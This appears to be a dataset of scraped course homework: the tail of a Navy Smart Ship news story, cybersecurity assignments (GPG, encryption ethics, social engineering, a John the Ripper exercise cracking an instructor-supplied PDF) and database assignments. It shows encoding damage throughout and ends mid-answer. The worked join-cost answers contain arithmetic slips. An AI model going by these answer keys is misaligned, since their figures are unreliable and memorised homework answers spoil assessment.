shutdowns that resulted from NT.â€ The Yorktown has been towed into port several times because of the systems failures, he said. â€œBecause of politics, some things are being forced on us that without political pressure we might not do, like Windows NT,â€ Redman said. â€œIf it were up to me I probably would not have used Windows NT in this particular application. If we used Unix, we would have a system that has less of a tendency to go down.â€ Although Unix is more reliable, Redman said, NT may become more reliable with time. The Navy is moving the serviceâ€™s command and control applications from Unix to NT as part of IT-21. Under IT-21, the Navy also plans to modernize ships in the Atlantic and Pacific fleets with asynchronous transfer mode LANs. Large ATM networks running NT have already been installed on the USS Abraham Lincoln and USS Essex. But DiGiorgio said the LANs might experience a chain reaction of computer failures like those experienced on the Yorktown. That domino effect is inherent to the system design of shipboard LANs, he said. â€œThere is very little segregation of error when software shares bad data,â€ DiGiorgio said. â€œInstead of one computer knocking off on the Yorktown, they all did, one after the other. What if this happened in Software glitches leave Navy Smart Ship dead in the water 5 1/21/2016 11:29 AM actual combat?â€ Although the Yorktown did not have backup systems, Redman said that future Smart Ships will have systems redundancy to ensure that ships can continue to operate. But DiGiorgio said that the Smart Ship project needs to do more engineering up front. â€œInstalling a control system on a warship and resolving problems as the project progresses is a costly and naive process,â€ DiGiorgio wrote in the Proceedings article. â€œNow, with the top people rotated off the Smart Ship Project, it would be wise for the Navy to investigate this fiasco more fully.â€ Redman has a different perspective. â€œIf it were me, I wouldnâ€™t say all the things that Tony [DiGiorgio] has said out of discretion and consideration for being a long-term employee,â€ he said. â€œBut I will say this about Tony, heâ€™s a very bright engineer.â€ â€œEverybody plays the obedience role where you cannot criticize the system,â€ said DiGiorgio, a self-described whistle-blower. â€œIâ€™m not that kind of guy.â€ Software glitches leave Navy Smart Ship dead in the water 6 1/21/2016 11:29 AM"
Foundations of Cybersecurity,3550,Private Keys,"CSSE 340: Foundations of Cybersecurity Homework 6 Winter 2022-2023 Due: 26 Jan 2023 SCORE: / 20 Use the command-line â€œGPGâ€ tools built into the Parrot VM (recommended) or install a free version of PGP-compatible communication software on your computer. Below are a list of utilities that are commonly used to sign, encrypt, and manage keys for PGP-compatible communications: Windows - https://www.gpg4win.org/ https://gnupg.org/ Mac - https://gpgtools.org/ Linux â€“ GNU Privacy Guard (GPG) â€“ install with your favorite package manager. If you want a graphical interface for GPG on the Parrot VM, install the â€œkleopatraâ€ package with the command â€œsudo apt install kleopatraâ€. Itâ€™s a good idea to search the Internet if you need help using the GPG tools â€“ there are lots of good resources out there. 1. Generate a keypair for signing and encrypting messages. Find your PGP public key fingerprint and paste it into the Moodle quiz. BE SURE TO SAVE YOUR PRIVATE KEY WHERE YOU CAN FIND IT AGAIN AND CHOOSE A PASSPHRASE YOU WILL NOT FORGET. If youâ€™re using Parrot, generate a keypair using this command: gpg --generate-key 2. Download and import your instructorâ€™s public key from Moodle. When downloaded to a file called â€œthekey.ascâ€ you can import it with: gpg --import thekey.asc 3. Export your public key and paste it into the Moodle quiz in ASCII armored format. (Hint: ASCII armored files look like ASCII text blobs with headers and footers.) You can use this command if youâ€™re doing this on the command line: gpg --export -a 4. Construct a message to your instructor that includes your name, email address, and one of your favorite quotes. Sign and encrypt an ASCII-armored message to your instructor. You can generate this on the command line with the following command: gpg -esa After issuing the command and selecting the recipients, type your message then type â€œcontrol-dâ€ to end your message. Paste this signed and encrypted message into the Moodle quiz. If you do not see the string â€œ----- BEGIN PGP MESSAGE-----â€ at the top of the output from pgp/gpg, it is not ascii armored. 5. Your instructor will email you an encrypted reply. Decrypt the reply and follow the instructions it contains to answer the final question on the Moodle quiz."
Foundations of Cybersecurity,3550,Cryptographers,"CY 2550 â€“ Foundations of Cybersecurity â€“ VSD Homework 80 points, due March 20 by 11:59pm. Note: Please complete this assignment in groups of approximately 4 students. In this assignment, you will perform part of a Value Sensitive Design (VSD) critique of the so-called â€œgoing darkâ€ debate. This is an exercise in applied ethics, critical thinking, and creativity â€“ we expect written answers, not code, pseudocode, or mathematical formulas. For your reference, there is general information available about VSD and the methods it employs at the following website: https:// vsd.ccs.neu.edu. Summary of the problem: In the U.S., law enforcement agencies may obtain legal access to computing devices and electronic communications. For example, the police may obtain a warrant that permits them to seize and analyze a computer belonging to a suspect in a crime, in order to search for evidence. The police may also obtain a warrant for a wiretap that allows them to surveil the electronic communications of a suspect. Finally, the police may obtain a subpoena that compels a communication company (e.g., a phone company or online messaging service like Facebook) to turn over electronic records and communications relating to a suspect. In recent years, however, powerful encryption has begun to proliferate across the consumer electronics space. Laptops and smartphones are often â€œencrypted by defaultâ€, meaning that a password or cryptographic key must be provided to unlock the data stored on the device. Similarly, end-to-end encrypted messaging apps like Signal are free and widely available. In both cases, the secrets necessary to decrypt the data are known only to end-users. Even if law enforcement were to try to compel the device maker, software developer, or service provider to grant access to data, they cannot comply â€“ only end-users can decrypt their data. Law enforcement agencies claim that they are â€œgoing darkâ€ because of the proliferation of strong cryptography. They claim that data that is necessary to solve crimes, and that they otherwise have lawful access to, is now inaccessible. Highprofile law enforcement officials like James Comey, Rod Rosenstein, and William Barr have called on tech companies to develop solutions that preserve the lawful access capabilities of law enforcement agencies to digital data and communications. For their part, tech companies and cryptographers assert that they cannot comply with the demands of law enforcement officials. They argue that any â€œback doorâ€ added to encryption systems to facilitate access by law enforcement would inevitably also be exploited by adversaries â€“ in other words, that there is no way to build a back door just for the â€œgood guysâ€. Further, this side argues that if U.S. law enforcement were to demand back door access to data and communications, law enforcement officials in other (possibly more authoritarian) countries would also demand similar access capabilities. Question 1 (20 points): List the direct and indirect stakeholders in the going dark debate. For each stakeholder, briefly explain the most important values they may have that are implicated in this debate. â€¢ Direct Stakeholders (and associated values) â€¢ Indirect Stakeholders (and associated values) Question 2 (10 points): Imagine that the U.S. Congress passed a law mandating that all encryption systems have a back door that allows lawful access by law enforcement agencies. Briefly describe some of the worst-case scenarios that could result due to this law (i.e., after U.S.-based encryption systems are updated to comply with the new law). What bad thing(s) could happen? To which stakeholders? What stakeholder's values or interests would be adversely impacted? Note: you donâ€™t need to be 100% comprehensive. You only need to identify scenarios that are foreseeable, consequential, and likely. You donâ€™t need to talk about extreme event like alien invasions. Question 3 (10 points): Imagine that U.S. law does not change, and that powerful encryption-by-default becomes the norm across all electronic devices and communication services. Briefly describe some of the worst-case scenarios that could occur in this situation. What bad thing(s) could happen? To which stakeholders? What stakeholder's values or interests would be adversely impacted? Note: as above, you donâ€™t need to be 100% comprehensive. Question 4 (30 points): It seems highly unlikely that a technical solution (e.g., a new cryptographic algorithm) can be developed that will resolve the going dark debate in a way that satisfies all stakeholders. In the absence of such a solution, tradeoffs must be made between the values of different stakeholders. If you were able to decide the outcome of the going dark debate, what outcome would you choose, and why? In answering this, make sure to explain: (i) which stakeholders and values your outcome favors, and which stakeholders and values are compromised; and (ii) why these value tradeoffs are appropriate. Hint: Are any stakeholder values illegitimate in this context? Are there rights that need to be respected? And which of the remaining values are strongest? Question 5 (10 points): Thus far, our analysis of the going dark debate has assumed a U.S. context. Would your proposal for how to resolve this debate (question 4) change if the debate was being held in a different country? Why or why not? What factors are relevant here? List all of your group members (gitlab usernames):"
Foundations of Cybersecurity,3550,Pretexting Tool,"Page 1 of 1 CSSE 340: Foundations of Cybersecurity Homework 8 Winter 2022-2023 Due: 16 Feb 2023 SCORE: / 100 Name: Print this document, write your answers on this paper, and hand it in before finishing the final lab. 1. Define the term â€œSocial Engineeringâ€. 2. In class we discussed â€œPretextingâ€ as a tool for social engineering; briefly explain an example of pretexting. 3. In class we discussed â€œMisdirectionâ€ as a tool for social engineering; briefly describe an example of misdirection. 4. Recall one of the social engineering exercises from class on the â€œSocial Engineeringâ€ day. a. In one or two sentences, describe the exercise. b. Identify each of the social engineering tools/techniques used in that exercise (e.g., â€œpretextingâ€) and explain how they were used in that specific case."
Foundations of Cybersecurity,3550,Decription,"CSSE 340: Foundations of Cybersecurity Homework 5 Winter 2021-2022 Due: Jan 11, 2022 SCORE: / 50 Start on this assignment early, it may take a while. Complete this in your own word-processed document. Include the following data at the top: the class ID (CSSE 340), the homework number, your name, and the due date. The SSL video is about 50 minutes long, so budget for at least that amount of time for the SSL and PKI questions. SSL and PKI: Watch Moxie Marlinspikeâ€™s talk on SSL (https://www.youtube.com/watch?v=Z7Wl2FW2TcA) and answer the following questions: 1. (3pts) What is the name of the tool Moxie created to perform man-in-the-middle attacks on SSL connections? 2. (5pts) Explain how the tool in problem 1 works. You may need to find additional information not available in the video to answer this. 3. (5pts) How can you modify or configure a web site to prevent Moxieâ€™s tool (problem 1) from working on that site? 4. (6pts) What are the two properties of Trust Agility? 5. (5pts) Describe one limitation of Moxieâ€™s proposed â€œConvergenceâ€ system. (continues on next page) PASSWORD Exercises: 6. (15pts) Install John the Ripper (jumbo free version 1.8 or later) and crack the password to the â€œQ6â€ PDF linked from the course schedule page. Use the â€œpdf2johnâ€ and â€œjohnâ€ command line tools (or similar programs). The answer to this question is in the PDF (requires password to read it). Decrypt that PDF and follow the instructions it contains to earn points on this question. You can get John here: http://www.openwall.com/john/ Download and extract version 1.9.0-jumbo-1 or newer. You MUST use a jumbo version of john or you will have trouble cracking the password. If you can, download the pre-built binaries (it is easier). The john tool cracks hashes, so first you will need to extract the hash from the PDF using pdf2john. If youâ€™re using Windows, the version of pdf2john that comes with 1.9.0-jumbo-1 is a perl script. You can use â€œgit bashâ€ or similar (perl should be installed in git bash) to run pdf2john.pl. Thereâ€™s a powershell module too, but may require some googling. If youâ€™d rather use python, get the pdf2john.py program from Moodle and run the python script however you like running python scripts. john is a command line tool, so you will need to use the Command Prompt to run it (or terminal on a non-Windows computer). The prebuilt binary â€œjohnâ€ ONLY works in the command prompt (not git bash). (Note: youâ€™ll need John later in this class, so keep it installed!) 7. (2pts) Was the â€œjohnâ€ activity an Online or an Offline dictionary attack? 8. (3pts) Was the â€œjohnâ€ activity a breach of attack on Confidentiality, Integrity, or Availability? Justify your answer. 9. (6pts) Describe two tools, procedures, or software features the owner of that encrypted PDF could use to make it significantly more difficult to attack."
Introduction to Database Systems Design,4350,PostgreSQL,"CS 430 - Database Systems Homework Assignment 5 (Due April 8, Tuesday) Recall the relational schema youâ€™ve designed for an art gallery in assignment 2. A database company called ArtBase builds a product for art galleries. The core of this product is a database with a schema that captures all the information that galleries need to maintain. Galleries keep information about artists, their names (which are unique), birthplaces, age and style of art. For each piece of artwork, the artist, the year it was made, its unique title, its type of art (e.g. painting, lithograph, sculpture, photograph), and its price must be stored. Pieces of artwork are also classified into groups of various kinds, for example, portraits, still lifes, works by Picaso, or works of the 19th century; a given piece may belong to more than one group. Each group is identified by a name (like those just given) that describes the group. Finally, galleries keep information about customers. For each customer, galleries keep that personâ€™s unique name, address, total amount of dollars spent in the gallery, and the artists and groups of art that the customer tends to like. The ER diagram for this application is as follows. A relational schema corresponding to the above ER diagram is given below. artist(a name:string, birthplace:string, age:int, style:string) artwork(title:string, year:int, type:string, price:real, a name:string) customer(cust id:string, c name:string, address:string, amount:real) 1 a group(g name:string) classify(title:string, g name:string) like group(cust id:string, g name:string) like artist(cust id:string, a name:string) 1. Implement this schema in the PostgreSQL instance running in the CS department. Consider the following points while working on this section. â€¢ Itâ€™s important that both primary key constraints as well as foreign key constraints are enforced. â€¢ You can assume that all String type attribute values will contain less than 100 characters. â€¢ For non integer numeric fields(price and amount) use the PostgreSQL data type â€˜double precisionâ€™ to inter-operate with Java float values. More on PostgreSQL data type is available in http://www.postgresql.org/docs/9.1/static/datatype.html 2. Write a client side implementation to access this database with JDBC. The guidelines for this implementation is given below. Itâ€™s important that these guidelines are strictly followed. â€¢ There will be an archive called assignment 5.tar that you should download which contains the necessary files. Itâ€™ll extract into a directory named assignment 5. It contains the following directories. â€“ src - the source directory. â€“ lib - the directory for third party libraries. â€“ Makefile - Make file for compiling the source. â€“ scripts - the directory to include the database scripts you will to writing as part of this assignment. Itâ€™s important that you do not change this directory structure. Grading scripts are written assuming this directory structure. â€¢ There will be a set of functionality that you need to implement as described later in this document. Each of this functionality requires you to implement a Java method at the client side. Some of these tasks require you to write some procedures at the database as well. There is a class structure provided to be used with this assignment. It contains a stub class and a set of supporting classes. â€“ Stub Class This class resides in the file src/cs430/a5/Stub.java This class contains empty methods for each of the tasks that needs to be implemented. You should implement the body of the each method as per the instructions provided later in this document. This class has a default constructor which should not be removed due to any reason. Also the signatures of the given methods should not be modified. The grading scripts assumes that the default constructor and the method signatures remain intact. â€“ Supporting Classes Entity sets and relationship sets are modeled as a set of classes. An object of one of these classes represents a record in the corresponding table. These supporting classes are introduced to reduce the complexity of having to pass around several 2 primitive data types. These classes are available inside src/cs430/a5/entity directory. There will be seven classes corresponding to the seven tables in the relational schema. These classes contain attributes representing the fields in the corresponding table. For instance, the class cs430.a5.entity.Artist contains four attributes. name(String), birthPlace(String), age(int) and style(String) modeling the four fields a name, birthplace, age and style in the artist table respectively. Do not change these supporting classes. â€“ You can implement your own classes while implementing these tasks. But do not change the method signatures of the Stub class or the supporting classes. â€¢ Compiling the source A make file is provided for compiling the code. The command make all will compile the code. You can use this file as it is. If you introduce packages beyond the depth of cs430.a5.**, then you will have to modify the line #9 of the file. This file is self explanatory. If you need any help modifying this file, please talk to the TA. â€¢ Use of third party libraries Itâ€™s required to use the PostgreSQL JDBC driver as a runtime library. You may need to download it and copy it to the lib directory. The make file provided for the building the project will include the content inside the lib directory to the classpath. Following functionality needs to be implemented. i). Add an artist to the database. This task should be implemented inside the body of the public void addArtist(Artist artist) throws SQLException method of the Stub class. And object of type Artist will be passed as an argument. You may use the getter methods of this object to access it attribute values. ii). Add a customer to the database. This task should be implemented inside the body of the public void addCustomer(Customer customer) throws SQLException method of the Stub class. iii). Add an artwork to the database. This task should be implemented inside the body of the public void addArtwork(Artwork artwork, String group) throws SQLException method of the Stub class. The requirement is different than the previous two tasks. For this task you should implement a â€˜stored procedureâ€™ at the database. This stored procedure should execute the following three tasks. â€¢ Add the new artwork to the table artwork. â€¢ Check if there is a group in the a group table with the given group name. If not add a record with the given group name. â€¢ Finally add an entry to the table classify with the title of the artwork and the group name. At the client side, inside the addArtwork method, you should invoke this stored procedure. 3 When the stored procedure is added to the database, it will persist. But for grading purposes, save this stored procedure into a file called q3.sql and include it inside the scripts directory. iv). Add records to like group table. This task should be implemented inside the body of the public void addLikeGroup(String customerId, String likeGroup) throws SQLException method of the Stub class. As part of this task, you need to implement a â€˜triggerâ€™ at the database. This trigger should be set to the INSERT operation of the like group table. The corresponding procedure should be invoked after inserting a record to the table. This procedure should carry out the following tasks. â€¢ It queries the classify table for the records with the same group name and extracts out the artworks for those records. â€¢ Then it queries for the artist names of these artworks. â€¢ Finally it should add records to the like artist table combining the artistâ€™s name and customer id if that combination is not already recorded. At the client side, implement a regular insert operation. At the database, itâ€™ll automatically invoke the trigger which results in an invocation of the above procedure. Similar to stored procedures, triggers and associated functions will be persisted in the database after they are registered for the first time. For grading purposes, copy the code of the trigger and the associated function into a file named q4.sql and include inside the scripts directory. v). Implementing update functionality for the style field of artist This functionality should be implemented inside the method public void updateArtistStyle(String artistName, String newStyle) throws SQLException of the Stub class. Upon invoking this method, it should update the style field of the artist record identified by the given artistâ€™s name to the new style value. vi). Reading from the database. There is a set of read operations that should be implemented for certain tables. They should return an array of the corresponding object types for the given table. â€¢ Get the list of artists. (Method: public Artist[] getArtists() throws SQLException) â€¢ Get the list of artworks. (Method: public Artwork[] getArtworks() throws SQLException) â€¢ Get the list of groups. (Method: public Group[] getGroups() throws SQLException) â€¢ Get the list of classify entries. (Method: public Classify[] getClassifyEntries() throws SQLException) â€¢ Get the list of like group entries. (Method: public LikeGroup[] getLikeGroupEntries() throws SQLException) â€¢ Get the list of like artist entries. (Method: public LikeArtist[] getLikeArtistEntries() throws SQLException) 4 Please pay attention to the following points when implementing the above functionality. There will be points allocated for them. â€¢ Use parameterized queries. Check the slides on JDBC for more information. â€¢ Efficiently manage connections. Itâ€™s not required to use any connection pooling library. Itâ€™s recommended to use a single connection throughout the program and close it at the end. The test script will be invoking close() of the Stub class at the end of the program. Link your connection termination logic with this method. A database server can only handle a finite number of connections at a given time. So itâ€™s really crucial that the connections are properly closed. â€¢ The code you write to deal with the database will throw SQL Exceptions. The signatures of the Stub defines them to be thrown out. So itâ€™s not required to handle them inside your code. Throwing them out of the method will be helpful to isolate issues while grading your program. â€¢ If you have any initialization code, place them inside the init() of the Stub class. It will be invoked immediately after a Stub object is constructed. Submission Instructions â€¢ Your final deliverable should include the following. â€“ Completed source code. â€“ A working make file. The provided make file works out of the box. But if you have deep package structure, you may need to update it. â€“ Any third party library used should be placed inside the lib directory. â€“ Code written at the database(part iii and iv) as separate files inside the scripts directory. â€“ If you feel that some additional information should be included for making grading easier, feel free to include them in a README file. â€¢ Make sure that the code runs on the department Linux machines. â€¢ Do not make changes to the tables in your database until the grading is completed from the due date. These code will be tested against your database instances in the department PostgreSQL server. â€¢ Rename the out most directory(assignment 5) to firstname lastname. Then create a tar archive by issuing the command; tar -cvf firname lastname.tar firstname lastname. If the student name is John Doe, then the directory name will be john doe and the tar file will be john doe.tar. â€¢ Upload the final tar file to RamCT by April 8, midnight. â€¢ Failing to adhere to conventions and guidelines may result in penalties or delays in grades. Resources Following resources will be useful while working on this assignment. â€¢ PostgreSQL Data Types - http://www.postgresql.org/docs/9.1/static/datatype.html 5 â€¢ PostgreSQL Stored Procedure tutorial - http://www.postgresqltutorial.com/introduction-to-postgresql-stored-procedures/ â€¢ pgSQL Procedural Language - http://www.postgresql.org/docs/9.1/static/plpgsql. html â€¢ PostgreSQL Triggers - http://www.postgresql.org/docs/9.1/static/sql-createtrigger. html â€¢ Prepared Statements - http://docs.oracle.com/javase/tutorial/jdbc/basics/prepared. html"
Introduction to Database Systems Design,4350,Database creation,"CMSC 23500 â€” Introduction to Database SystemsHomework #4April 24, 2008InstructionsFor this homework, you must submit two SQL files (exercise1.sql and exercise2.sql)with the solution to your exercises. The SQL code contained therein must run correctly under SQLite. Incorrect code will receive, at most, half credit. The grader willtest the code like this:$ sqlite3 bookshop.db < exercise1.sql$ sqlite3 hospital.db < exercise2.sqlbookshop.db will be an empty database, and hospital.db will be the same Hospitaldatabase file provided with this homework on the course website.1 Database creation (30 points)Write the CREATE TABLE statements for the following relational database (10 points):Write the INSERT statements to add the following data to the database (10 points):1PublisherCode Name Address Budget1 â€œRandom J. Houseâ€ â€œ42 Foobar Driveâ€ 100002 â€œMorganâ€™s Laws Kaufmannâ€ â€œ37 Snafu Streetâ€ 25000BookISBN Author Title SuggestedPrice1111111 1001 â€œEnderâ€™s Gameâ€ 19.992222222 1002 â€œI, Robotâ€ 25.993333333 NULL â€œEl Mio Cidâ€ 12.99BookshopCode Name1 â€œDennisâ€™s House of Booksâ€2 â€œRitchieâ€™s Bookshopâ€SuppliesPublisher Book Bookshop Amount1 1111111 1 501 1111111 2 1001 2222222 2 751 3333333 1 1502 1111111 2 252 2222222 1 2252 3333333 2 175AuthorCode Name Address Telephone1001 Orson Scott Card â€œGreensboro, North Carolinaâ€ â€œ555-1024â€1002 Isaac Asimov â€œNot Applicableâ€ NULLCreate a view called SuppliesView with the following information (10 points):â€¢ Publisher nameâ€¢ Book titleâ€¢ Bookshop nameâ€¢ The number of books supplied by the publisher to the bookshop2 Queries (10 points each, 70 total)Write the following queries in SQL. All these queries depend on the Hospital database(schema shown in figure 1). See the Discussion Session #4 handout (April 21) formore details on how to interpret the schema.1. Malpractice queries (from Discussion Session #4). Write the following twoqueries:Figure 1: Relational schema for the Hospital databaseâ€¢ Obtain the names of all physicians that have performed a medical procedurethey have never been certified to perform.Name----------------Christopher Turkâ€¢ Obtain the names of all physicians that have performed a medical procedure that they are certified to perform, but such that the procedure wasdone at a date (Undergoes.Date) after the physicianâ€™s certification expired(Trained In.CertificationExpires).Name------------Todd Quinlan2. Same as the previous queries, but include the following information in the results:Physician name, name of procedure, date when the procedure was carried out,name of the patient the procedure was carried out on. In the second query, alsoinclude the date when the certification expired.Physician Procedure Date Patient---------------- --------------------- ---------- ----------Christopher Turk Complete Walletectomy 2008-05-13 Dennis DoePhysician Procedure Date Patient------------ -------------------------- ---------- ----------Todd Quinlan Obfuscated Dermogastrotomy 2008-05-09 Dennis DoeCertificationExpires--------------------2007-12-313. Obtain the information for appointments where a patient met with a physicianother than his/her primary care physician. Show the following information: Patient name, physician name, nurse name (if any), start and end time of appointment, examination room, and the name of the patientâ€™s primary care physician.Note: You will have to read up on SQLâ€™s LEFT JOIN operator.Patient Physician Nurse Start---------- ------------ ------------ ----------------Dennis Doe Percival Cox Paul Flowers 2008-04-25 10:00Dennis Doe Percival Cox 2008-04-26 10:00John Smith Christopher 2008-04-26 12:00Dennis Doe Molly Clock Laverne Robe 2008-04-27 10:00End ExaminationRoom PCP---------------- --------------- ----------------2008-04-25 11:00 B Christopher Turk2008-04-26 11:00 C Christopher Turk2008-04-26 13:00 C John Dorian2008-04-21 11:00 A Christopher Turk4. The Patient field in Undergoes is redundant, since we can obtain it from the Staytable. There are no constraints in force to prevent inconsistencies between thesetwo tables. More specifically, the Undergoes table may include a row where thepatient ID does not match the one we would obtain from the Stay table throughthe Undergoes.Stay foreign key. Select all rows from Undergoes that exhibit thisinconsistency.Patient Procedure Stay Date Physician---------- ---------- ---------- ---------- ----------100000001 7 3217 2008-05-10 7AssistingNurse--------------1015. Deadly nurse query (from Discussion Session #4): Obtain the names of all thenurses who have ever been on call for room 123.Name---------------Laverne RobertsPaul Flowers6. The hospital has several examination rooms where appointments take place.Obtain the number of appointments that have taken place in each examinationroom.ExaminationRoom Number--------------- ----------A 3B 3C 37. Obtain the names of all patients (also include, for each patient, the name of thepatientâ€™s primary care physician), such that all the following are true:â€¢ The patient has been prescribed some medication by his/her primary carephysician.â€¢ The patient has undergone a procedure with a cost larger that $5,000â€¢ The patient has had at least two appointment where the nurse who preppedthe appointment was a registered nurse.â€¢ The patientâ€™s primary care physician is not the head of any department.Name Name---------- -----------John Smith John Doria"
Introduction to Database Systems Design,4350,History,"CS 533 Database SystemsHomework Assignment 2 - Due September 29Wednesday1. A history is serializable if its effects on the database are the same as thatof some serial history, regardless of what the initial state of the database is.Consider each of the following histories:(a) r1[A],r2[A],r3[B], c3,w1[A],r2[C],r2[B],w2[B], c2,w1[C], c1(b) r1[A],r2[A],w1[B],w2[B],r1[B],r2[B],w2[C], c2,w1[D], c1Answer the following questions about each of the above histories.(a) Is the history serializable according to the definition given above?(b) Draw the serialization graph for the history.(c) Is the history conflict-serializable? If so, what are all the equivalentserial histories?(d) Is the history recoverable?(e) Does the history avoid cascading aborts?(f) Is the history strict?2. The action of multiplication by a constant factor can be modeled by an action of its own. Suppose MC(X, c)stands for an atomic execution of the stepsREAD(X,t);t := c âˆ— t;WRIT E(X,t); where X is a data item and t is a temporary variable used by the transaction. We can also introduce a lock modethat allows only multiplication by a constant factor. Show the compatibilitymatrix for read, write, and multiplication-by-a-con stant lock.3. Here is a history with one action missing:r1[A],r2[B],âˆ’ âˆ’ âˆ’,w1[C],w2[A]1Your problem is to figure out what actions of certain types could replace theâˆ’ âˆ’ âˆ’ and make the history not be conflict serializable. Tell all possiblenon-serializable replacements for each of the following types of operation:(a) Read operation(b) Write operation4. Consider the following history:r1[A],r2[B],r3[C],r1[B],r2[C],r3[D],w1[A],w2[B],w3[C]Do each of the following:(a) Insert read and write locks, and insert unlock actions. Place a read lockimmediately in front of each read operation that is not followed by awrite operation of the same data item by the same transaction. Placea write lock in front of every other read or write operation. Place thenecessar y unlocks at the end of every transaction.(b) Tell what happens when each history is run by a scheduler that supportsread and write locks.5. Are two histories having identical serialization graph conflict equivalent?Explain.6. Two transactions are not interleaved in a history if every operation of onetransaction precedes every operation of the other. Give an example of aserializable history H that has all of the following properties:(a) transactions T1 and T2 are not interleaved in H,(b) T1 precedes T2 in H, and(c) in any serial history equivalent to H, T2 precedes T17. Consider the following history Hr2[y],r1[x],r3[y],r2[x],w2[y], c2,w1[x], c1,r3[x], c3Assuming that each transaction is consistent, does the final database statesatisfy all the integrity constraints? Explain.8. Suppose that transactions T1 and T2 can be decomposed into the subtransactions T1 : T11,T12 and T2 : T21,T22 such that each subtransaction individuallymaintains the integrity constraints of the database. Instead of guaranteeingthat all histories involving T1 and T2 are conflict-serializable, suppose thatthe concurrency control guarantees that all subtransactions are executed using 2PL.2(a) Will we always get a conflict-serializable execution of T1 and T2? Explain.(b) Will integrity constraints be maintained by all possible histories? Explain."
Introduction to Database Systems Design,4350,ER Diagrams,"CS 430 - Database SystemsHomework Assignment 1(Due February 6, Friday)1. The Prescriptions-R-X chain of pharmacies has offered to give you a free lifetime supply of medicine ifyou design its database. Given the rising cost of health care, you agree. Here is the information that yougather:â€¢ Patients are identified by an SSN, and their names, addresses, and ages must be recorded.â€¢ Doctors are identified by an SSN. For each doctor, the name, specialty, and years of experience mustbe recorded.â€¢ Each pharmaceutical company is identified by name and has a phone number.â€¢ For each drug, the trade name and formula must be recorded. Each drug is sold by a given pharmaceutical company, and the trade name identifies a drug uniquely from among the products of thatcompany. If a pharmaceutical company is deleted, you need not keep track of its products any longer.â€¢ Each pharmacy has a name, address, and phone number.â€¢ Every patient has a primary physician. Every doctor has at least one patient.â€¢ Each pharmacy sells several drugs and has a price for each. A drug could be sold at several pharmacies, and the price could vary from one pharmacy to another.â€¢ Doctors prescribe drugs for patients. A doctor could prescribe one or more drugs for several patients,and a patient could obtain prescriptions from several doctors.â€¢ Each prescription has a date and a quantity associated with it. You can assume that, if a doctorprescribes the same drug for the same patient more than once, only the last such prescription needs tobe stored.â€¢ Pharmaceutical companies have long-term contracts with pharmacies. A pharmaceutical companycan contract with several pharmacies, and a pharmacy can contract with several pharmaceutical companies. For each contract, you have to store a start date, an end date, and the text of the contract.â€¢ Pharmacies appoint a supervisor for each contract. There must always be a supervisor for each contract, but the contract supervisor can change over the lifetime of the contract.1. Draw an ER diagram that captures the preceding information. Identify any constraints not captured bythe ER diagram.12. How would your design change if each drug must be sold at a fixed price by all pharmacies?3. How would your design change if the design requirements change as follows: If a doctor prescribes thesame drug for the same patient more than once, several such prescriptions may have to be stored.Please keep in mind:â€¢ This assignment is to be done individually. The honor code is in effect.â€¢ Submission must be made through RamCT by Friday, February 6.â€¢ No late work will be accepted except in exigent situations.â€¢ Your answers must be typed and turned in as a PDF file."
Introduction to Database Systems Design,4350,NestedLoop joins,"CS411 Database SystemsFall 2009HW#4Due: 3:15pm CST, November 17, 2009Note: Print your name and NetID in the upper right corner of every page of your submission.Hand in your stapled homework to Donna Coleman in 2106 SC. In case Donna is not in office,slide your homework under the door.To grade homeworks faster, the homework is partitioned into two parts. Please, submiteach part separately. For each part, make sure to write down your name and NetID.Handwritten submissions will be graded but they will take longer to grade. For clarity,machine formatted text is preferable: Expect to lose points if your handwritten answer isunclear or misread by the grader.This homework is partitioned into two parts as follows:â€¢ Part 1: Problem 1 - Problem 3â€¢ Part 2: Problem 4 - Problem 71Part 1Problem 1 Nested-Loop Joins (16 points)1. Suppose B(R) = B(S) = 10,000. For what value of M would we need to compute R !"" Susing the nested-loop join algorithm with no more than the following number of I/Os? (8points, 4 points each)Using the equation given in Section 15.3.4 of the textbook, solve for M:I/O = B(S) + (B(S)B(R))(Mâˆ’1)(a) 100,000100,000 = 10,000 + (10,000Ã—10,000)(Mâˆ’1)M = 1,112.1 or ceil(M) = 1,113(b) 25,00025,000 = 10,000 + (10,000Ã—10,000)(Mâˆ’1)M = 6,667.7 or ceil(M) = 6,6682. If two relations R and S are both unclustered, it seems that the nested-loop join algorithmrequires about T(R)T(S)/M disk I/Os. How can you do signicantly better than this cost?Describe your modied version of the nested-loop algorithm and give the number of disk I/Osrequired for your algorithm. We assume that M is large enough such that M ? 1 ! M , andthat B(R) ! T (R) and B(S) ! T (S); that is, the number of tuples of a relation is muchgreater than that of blocks of the relation. (8 points)Note that the cost of algorithm given in the question is T(R)T(S)/M, which means it isusing tuple-based nested-loop join. In order to improve the disk I/O cost of nested-loop joinalgorithm, we need to use block-based nested-loop join. In order to carry out block-basednested loop join efficiently, we need the inner relation clustered, and search structure builton the common attributes of R and S.Let R be the inner relation (assuming S is smaller):â€¢ Cost of reading all tuples of R, cluster them, and write them back: T(R) + B(R)â€¢ Cost of Reading tuples of S, plus the cost of joining them with R in the main memory:T(S) + B(S)B(R)MTherefore the total cost is T(R) + B(R) + T(S) + B(S)B(R)M .2Problem 2 Two-pass Algorithms Based on Sorting (20 points)1. Suppose we have a relation with 1,000,000 records and each records requires 10 bytes.Let the disk-block size be 4,096 bytes. (8 points, 4 points each)(a) What is the minimum number of blocks in main memory required for using TPMMS(Two-Phase Multiway Merge-Sort) to sort these records?The size of the relation in bytes is 1,000,000 Ã— 10 = 10,000,000 bytes, and eachdisk-block is 4,096 bytes. The minimum number of blocks to hold the relation isceil( 10,000,0004,096 ) = 2,442. The minimum M requirement for TPMMS is B â‰¤ M2, M mustat least be ceil(âˆš2, 442) = ceil(49.4) = 50.(b) Following (a), how many disk I/Os are needed to sort all the records?Number of disk I/O for TPMMS is 3B, which is 3 Ã— 2,443 = 7,3292. We have two relations R and S where B(R) = B(S) = 10, 000. Give an approximate sizeof main memory M required and the number of disk I/Os in order to perform the two-passalgorithms for the following operations: (12 points, 4 points each)(a) set unionUsing the equation given in Section 15.4.9 of the textbook:I/O of set union operation = 3 Ã—(B(S) + B(R))= 3 Ã—(10,000 + 10,000)= 60,000Approximate M requirement for set union operation is !(B)R + B(S) = âˆš20, 000 =141.42, which the given M satisfies.(b) simple sort-joinI/O of set union operation = 5 Ã—(B(S) + B(R))= 5 Ã—(10,000 + 10,000)= 100,000Note that given figures satisfy the required M, which is B(S) and B(R) â‰¤ M2, i.e.10,000 â‰¤ 10,00,000(c) the more efficient sort-join described in Section 15.4.8 of the textbookI/O of set union operation = 3 Ã—(B(S) + B(R))= 3 